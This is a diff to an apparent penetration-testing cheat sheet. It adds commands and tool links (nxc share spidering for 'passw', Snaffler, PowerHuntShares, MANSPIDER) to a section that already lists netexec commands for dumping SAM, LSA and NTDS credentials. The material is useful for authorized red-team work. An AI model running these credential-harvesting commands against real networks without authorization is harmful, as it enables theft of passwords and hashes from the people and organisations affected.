@@ -798,6 +798,7 @@ $ netexec smb <IP address> --local-auth -u <username> -p <password> --sam
 $ netexec smb <IP address> --local-auth -u <username> -p <password> --lsa
 $ netexec smb <IP address> -u <username> -p <password> --ntds
 $ netexec smb <IP address> -u <username> -p <password> -M ntdsutil
+$ nxc smb  <IP address> -u <username> -p <password> --spider IT --content --pattern "passw"
 ```
 
 - PCredz
@@ -1058,13 +1059,22 @@ C:\> cmdkey /list
 - Snaffler
 
 ```
+https://github.com/SnaffCon/Snaffler
 C:\> snaffler.exe -s
 ```
 
-- Invoke-HuntSMBShares
+- PowerHuntShares
 
 ```
+https://github.com/NetSPI/PowerHuntShares
 PS C:\> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+```
+
+- MANSPIDER
+
+```
+https://github.com/blacklanternsecurity/MANSPIDER
+$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <IP address> -c '<search string' -u '<username>' -p '<password>!'
 ```
 
 - Pypykatz
